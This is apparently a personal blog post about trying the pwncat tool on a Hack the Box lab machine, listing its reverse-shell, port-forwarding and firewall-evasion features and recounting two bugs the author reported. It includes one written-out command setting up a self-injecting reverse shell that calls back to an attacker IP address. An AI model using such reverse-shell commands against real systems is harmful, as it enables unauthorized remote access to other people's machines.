---
layout: post
author: dalemazza
title: Pwncat - Netcat on steroids!  
date: 2020-06-21
category: blog
tags: blog
---


## Do you hate when you Ctrl+c in a reverse shell and lose it? I did until I found Pwncat!  

<p align="center">
  <img width="400" height="400" src="/assets/pwncat.jpg">
</p>

Recently I was doing a machine on Hack the box, I managed to get a reverse shell on the machine but it was flaky and kept crashing on me. This got me thinking that surely someone somewhere has made a script to fix this problem?  

After some google fu I stumbled across this [github](https://github.com/cytopia/pwncat) repo. It had everything I had ever dreamed about in one tool! Some highlights include:  

* Port Scanning
* Self-injecting reverse shell
* Bind shell
* Reverse shell
* Port forwarding
* Protection from Ctrl+c !!!!!!
* Evade IPS and Firewall
* Plus much more!

I had to try this tool! So I cloned the repo and put it to the test. I quickly wanted to try the `--self-inject` function out. To my surprise it caught the reverse shell but did not work after after upgrading the shell to TTY.  

## Bug 1  

During the process to upgrade the shell to TTY I found that the shell would crash after the last stage of returning to the shell with the command `fg`. I then approached the creator on github and entered the issue as a bug. The creator quickly resolved the issue, It was related to how the shell interpreted the “enter” after the `fg`. The bug was fixed, Now to try again!  

## Bug 2  

Now I had a full TTY shell. I went back and tried to catch the shell again but with the `--self-inject` flag. After setting up the pwncat listener with the inject flag `pwncat -l 1234 --self-inject /bin/bash:10.10.14.28:1234` I quickly learnt that it was not injecting into a python binary. Once again I submitted this as a bug and he quickly solved the issue. This time it was related to the way the reverse shell sends back the shell, he had to change the way pwncat behaved to interpret many types of reverse shell. 1 day later he sent me a message saying he had a fix! Third times the charm.
***
## How does it work?  
